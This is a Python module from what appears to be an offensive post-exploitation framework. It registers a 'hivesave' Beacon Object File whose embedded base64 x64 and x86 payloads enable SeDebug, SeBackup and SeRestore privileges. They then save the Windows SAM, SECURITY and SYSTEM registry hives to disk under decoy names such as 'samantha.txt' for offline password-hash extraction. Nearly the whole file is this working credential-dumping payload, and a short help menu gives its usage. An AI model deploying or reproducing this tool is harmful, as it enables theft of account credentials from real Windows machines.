import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("hivesave")
class HashDumpBof(Bof):
	base64bof: str = "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"
	x86base64bof: str = "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"

	def help_menu():
		menu = """
Dumps registry SAM / SECURITY / SYSTEM  to a path of your choosing
Usage: bofexec hashdump -z [Optional: <OutPath: C:\\\\Temp>]
"""
		print(brightgreen + menu + reset)
		return